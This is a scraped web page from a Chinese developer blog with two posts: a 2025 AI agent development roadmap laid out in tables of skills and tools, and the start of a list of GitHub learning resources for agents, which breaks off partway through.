                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote>
<p>今天，我们将通过一份2025年AI Agent开发路线图，全面解析Agent开发领域的核心技术栈和发展路径。</p>
<h2 data-id="heading-0">什么是AI Agent？</h2>
<p>不只是聊天机器人。AI Agent与传统聊天机器人的根本区别在于<strong>自主性</strong>。一个真正的AI Agent能够理解复杂目标，制定计划，使用工具执行任务，并根据结果调整策略——这一切只需要你给出一个高级指令。</p>
<p>想象一下，你告诉Agent："帮我分析一下新能源汽车市场的最新趋势，并在周五前准备一份10页的报告"。一个真正的AI Agent会自主完成：搜索最新行业数据、分析竞争对手信息、制作图表并生成完整报告。</p>
<h2 data-id="heading-1">核心开发层次全解析</h2>
<h3 data-id="heading-2">编程与提示工程</h3>
<p>任何AI Agent开发都从这里开始。<strong>Python</strong>仍然是首选语言，但JavaScript/TypeScript的使用也在增长。除了基础编程能力，提示工程是关键技能。</p>

















<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>编程与提示</strong></td><td>编程语言（如基础语法）；脚本与自动化（如API请求、文件处理）；提示概念（如提示工程、思维链提示）</td><td>异步编程；网络抓取；多 Agent提示；目标导向提示；自我批判与重试循环；反思循环</td><td>Python（首选）；JavaScript；TypeScript；Shell/Bash；HTTP/JSON库（如requests in Python）；文件处理库（如os, pathlib）；异步库（如asyncio）；网络抓取库（如BeautifulSoup, Scrapy）</td></tr></tbody></table>
<h3 data-id="heading-3">AI Agent基础架构</h3>
<p>理解AI Agent的基本构成要素是核心：LLM作为 Agent的大脑，负责决策和推理；工具作为Agent的手脚，允许它与外界交互；记忆系统存储Agent的经验；规划器负责制定和执行计划。</p>

















<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>AI Agent基础</strong></td><td>AI Agent定义；自治 vs. 半自治 Agent； Agent组件（如LLM、工具、记忆、规划器）</td><td>Agent架构设计</td><td>LangChain（ Agent框架）；LlamaIndex（数据索引与 Agent）；Haystack（搜索 Agent）；Semantic Kernel（微软 Agent框架）；AutoGen（多 Agent）；CrewAI（团队 Agent）</td></tr></tbody></table>
<h3 data-id="heading-4">LLM调用与工具集成</h3>
<p>LLM调用是Agent工作的基础，而工具调用则是Agent技术的杀手级功能。通过工具，Agent可以执行代码计算、进行网络搜索、查询数据库、操作浏览器和调用任何API接口。</p>























<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>LLM调用</strong></td><td>LLM API调用；提示模板（如动态提示、条件提示）</td><td>高级调用（如流式传输、批量/并行调用、回调/钩子）；提示链</td><td>OpenAI API；Anthropic API；Google AI；Cohere；Grok；本地LLM（如Ollama, LM Studio）；LangChain的LLM集成模块</td></tr><tr><td><strong>工具调用</strong></td><td>工具集成（如自定义工具、预构建工具）；工具类型（如搜索、计算、代码执行）</td><td>浏览器自动化；数据库查询；外部API集成</td><td>LangChain Tools；LlamaIndex Tools；Hugging Face Agents；Selenium（浏览器）；SQLAlchemy（数据库）；各种API SDK</td></tr></tbody></table>
<h3 data-id="heading-5">RAG与高级推理</h3>
<p>检索增强生成（RAG）技术让Agent能够访问特定领域知识，而不需要重新训练模型。规划与推理能力则决定了Agent处理复杂任务的智能水平。</p>























<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>检索增强生成（RAG）</strong></td><td>嵌入模型；向量存储；简单RAG</td><td>高级RAG（如查询重写、重新排名）； AgentRAG</td><td>OpenAI Embeddings；Sentence Transformers；Cohere Embeddings；FAISS（本地向量库）；Pinecone/Weaviate/Chroma/Milvus（托管向量DB）</td></tr><tr><td><strong>规划与推理</strong></td><td>规划技术（如ReAct, Plan-and-Solve）；推理引擎（如LLM作为推理器）</td><td>Tree of Thoughts；Graph-based Planning；自问自答；辩论式推理</td><td>LangChain的ReAct链；自定义LLM推理模块</td></tr></tbody></table>
<h3 data-id="heading-6">多Agent系统与状态管理</h3>
<p>单个Agent能力有限，但多Agent系统可以完成惊人复杂的任务。记忆与状态管理确保了Agent能够保持连续性和学习能力。</p>























<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>多 Agent系统</strong></td><td>Agent协作（如分层 Agent、辩论 Agent）</td><td>合作 Agent</td><td>AutoGen；CrewAI；Multi-Agent LangChain</td></tr><tr><td><strong>记忆与状态管理</strong></td><td>记忆类型（如短期/长期记忆、共享记忆）；状态管理（如会话状态）</td><td>持久化状态</td><td>Redis（缓存记忆）；SQL Databases（如SQLite/PostgreSQL）；Vector Stores for Memory（如Pinecone用于长期记忆）</td></tr></tbody></table>
<h3 data-id="heading-7">用户界面与部署</h3>
<p>优秀的用户界面让Agent能力更容易被使用者接受，而稳健的部署方案是生产环境应用的基础。</p>























<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>用户界面</strong></td><td>UI框架；交互（如聊天界面）</td><td>多模态输入；实时反馈</td><td>Streamlit/Gradio/Chainlit（快速原型）；Flask/Django（后端UI）；React/Vue（前端UI）</td></tr><tr><td><strong>部署</strong></td><td>API部署；Agent托管服务</td><td>无服务器函数；向量DB托管</td><td>FastAPI/Streamlit/Gradio（API/UI）；Docker；Kubernetes；Replit/Modal（托管）；Pinecone等向量DB服务</td></tr></tbody></table>
<h3 data-id="heading-8">监控评估与安全治理</h3>
<p>随着Agent能力增强，监控评估和安全治理变得至关重要。这不仅关系到系统稳定性，也涉及到伦理和法律合规问题。</p>























<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>监控与评估</strong></td><td>Agent评估指标；人机环路反馈</td><td>日志/追踪；自动评估循环；自定义仪表板</td><td>LangSmith（LangChain监控）；OpenTelemetry（追踪）；Prometheus/Grafana（指标监控）</td></tr><tr><td><strong>安全与治理</strong></td><td>提示注入保护；API密钥管理；用户认证</td><td>基于角色的访问控制（RBAC）；输出过滤；红队测试；数据隐私与合规</td><td>自定义防护提示；密钥管理工具（如Vault）；Auth0/OAuth（认证）；RBAC库（如Casbin）；合规模块（如GDPR工具）</td></tr></tbody></table>
<h2 data-id="heading-9">2025年趋势展望</h2>
<ul>
<li>本地化部署（Ollama等工具让本地运行大模型成为可能）</li>
<li>多模态融合（Agent不仅能处理文本，还能理解图像、音频）</li>
<li>专业化发展（领域特定Agent将超过通用Agent）</li>
<li>安全优先（随着应用深入，安全性将成为核心考量）</li>
</ul>
<h2 data-id="heading-10">如何开始你的AI Agent开发之旅？</h2>
<p>如果你是初学者，建议按照以下路径学习：</p>
<ol>
<li>掌握Python基础和API调用；</li>
<li>学习提示工程基础；</li>
<li>尝试LangChain等框架构建简单Agent；</li>
<li>集成工具扩展Agent能力；</li>
<li>添加RAG提供专业知识；</li>
<li>探索多Agent协作场景。</li>
</ol>
<p>对于有经验的开发者，可以重点关注：</p>
<ul>
<li>高级规划与推理技术</li>
<li>多Agent系统架构</li>
<li>生产环境部署与监控</li>
<li>安全与合规框架。</li>
</ul>
<h2 data-id="heading-11">结语</h2>
<p>AI Agent技术正在快速发展，2025年将是关键的一年。随着技术的成熟和工具的完善，我们将看到越来越多强大的AI Agent应用于各行各业。</p>
<hr/>
<p>以上内容基于本人近期整理的一份AI Agent路线图文件，如有需要，请在“基线沉思”公众号回复“agent路线图”获取下载链接。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d67245d37d2f4e66b305b3c284759e2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941863&amp;x-signature=PqmN6CS2VNRFxcDMeCbRXGzC0v0%3D" alt="" loading="lazy"/></p>
<p>路线图json文件可以使用在线工具打开：<a href="https://link.juejin.cn?target=https%3A%2F%2Fexcalidraw.com%2F" target="_blank" title="https://excalidraw.com/" ref="nofollow noopener noreferrer">excalidraw.com</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/295ee9635adc4ad385fcb7c62b852267~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941863&amp;x-signature=FlX10zdIz2YmLUeJAeCe%2FyOMmcc%3D" alt="" loading="lazy"/></p>
<p>上图来自：<a href="https://link.juejin.cn?target=https%3A%2F%2Froadmap.sh%2Fai-agents%3Ffl%3D1" target="_blank" title="https://roadmap.sh/ai-agents?fl=1" ref="nofollow noopener noreferrer">roadmap.sh/ai-agents?f…</a></p>
<h2 data-id="heading-12">学习资源推荐</h2>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025年AI智能体开发完全指南：10个GitHub顶级教程资源助你从入门到精通]]></title>    <link>https://juejin.cn/post/7581752787564560424</link>    <guid>https://juejin.cn/post/7581752787564560424</guid>    <pubDate>2025-12-10T03:24:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581752787564560424" data-draft-id="7581765536372736009" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025年AI智能体开发完全指南：10个GitHub顶级教程资源助你从入门到精通"/> <meta itemprop="keywords" content="Agent,LLM,程序员"/> <meta itemprop="datePublished" content="2025-12-10T03:24:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI大模型"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025年AI智能体开发完全指南：10个GitHub顶级教程资源助你从入门到精通
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI大模型
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:24:44.000Z" title="Wed Dec 10 2025 03:24:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读24分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote>
<p>人工智能智能体（AI Agents）作为当前AI领域最具前沿性的技术方向，正在推动着自动化决策、多模态交互和复杂任务执行的革命性发展。本文精选了十个高质量的GitHub开源项目，涵盖从基础理论到实践应用的全方位学习路径，为AI开发者提供系统性的技术资源。</p>
<h2 data-id="heading-0">1、Hands-On Large Language Models - 大型语言模型实战指南</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FHandsOnLLM%2FHands-On-Large-Language-Models" target="_blank" title="https://github.com/HandsOnLLM/Hands-On-Large-Language-Models" ref="nofollow noopener noreferrer">github.com/HandsOnLLM/…</a></p>
<p><strong>⭐ Stars：</strong>  16.7k+ | <strong>📈 活跃度：</strong>  高 | <strong>🏷️ 主要语言：</strong>  Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dec7d5cca40f452999755b075ff20552~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=Mfod6R1Cx32fEXRIjRDSXF0TkXI%3D" alt="" loading="lazy"/></p>
<p>这是Jay Alammar和Maarten Grootendorst合著的《Hands-On Large Language Models》官方配套代码仓库，被誉为"图解版LLM教程"。项目提供了11个章节的完整学习体系，包含近300个定制图表和丰富的Jupyter Notebook实践案例。</p>
<h4 data-id="heading-1">技术特色</h4>
<ul>
<li><strong>可视化教学体系</strong>：通过近300个定制图表深入浅出地解释LLM核心概念m</li>
<li><strong>完整章节覆盖</strong>：从语言模型介绍、Token处理到高级微调技术的全栈学习路径</li>
<li><strong>Google Colab集成</strong>：所有示例均可在Google Colab上运行，支持T4 GPU免费使用</li>
<li><strong>多种微调技术</strong>：涵盖BERT微调、提示工程、语义搜索等前沿技术</li>
<li><strong>生产级实践</strong>：提供从模型训练到部署的完整工程化流程</li>
</ul>
<h4 data-id="heading-2">核心章节</h4>
<ol start="0">
<li><strong>语言模型基础</strong> - Pipeline创建和文本生成</li>
<li><strong>Token与嵌入</strong> - 分词器工作原理和向量表示</li>
<li><strong>文本分类</strong> - 情感分析和分类任务实现</li>
<li><strong>聚类与主题建模</strong> - 无监督学习应用</li>
<li><strong>提示工程</strong> - 高级提示技巧和策略</li>
<li><strong>语义搜索</strong> - 向量数据库和相似性检索</li>
<li><strong>BERT微调</strong> - 命名实体识别等下游任务</li>
</ol>
<h4 data-id="heading-3">适用场景</h4>
<ul>
<li>LLM算法工程师技能提升</li>
<li>企业级LLM应用开发</li>
<li>学术研究中的模型微调实验</li>
<li>AI产品经理技术理解需求</li>
</ul>
<hr/>
<h2 data-id="heading-4">2、AI Agents for Beginners - 微软官方AI智能体入门课程</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2Fai-agents-for-beginners" target="_blank" title="https://github.com/microsoft/ai-agents-for-beginners" ref="nofollow noopener noreferrer">github.com/microsoft/a…</a></p>
<p><strong>⭐ Stars：</strong>  5.2k+ | <strong>📈 活跃度：</strong>  高 | <strong>🏷️ 主要语言：</strong>  Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4a6309d68d54b3cb55a1ccee60e20ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=is%2FxabOytK7MLFToDZJaZrKStpM%3D" alt="" loading="lazy"/></p>
<p>微软官方推出的完整AI智能体学习课程，从零开始到实际部署的11章渐进式教程。该项目不仅提供理论基础，还包含丰富的实践项目和多语言支持。</p>
<h4 data-id="heading-5">课程结构</h4>
<ul>
<li><strong>智能体概念理解</strong>：定义AI智能体的核心组件（环境、传感器、执行器）</li>
<li><strong>智能体类型分类</strong>：简单反射、基于模型、目标导向、效用型、学习型和多智能体系统</li>
<li><strong>Azure AI服务集成</strong>：使用Azure AI Agent Service构建生产级智能体</li>
<li><strong>智能体设计模式</strong>：多步骤提示、协作模式和分布式智能体架构</li>
<li><strong>可信AI智能体</strong>：安全性、可控性和人机协作最佳实践</li>
</ul>
<h4 data-id="heading-6">技术栈特色</h4>
<ul>
<li><strong>Azure Cognitive Services</strong>：企业级AI服务集成</li>
<li><strong>OpenAI API</strong>：GPT模型集成和应用</li>
<li><strong>多框架支持</strong>：AutoGen、Semantic Kernel等主流框架</li>
<li><strong>实时学习能力</strong>：支持环境反馈和用户交互的持续改进</li>
</ul>
<h4 data-id="heading-7">实践应用场景</h4>
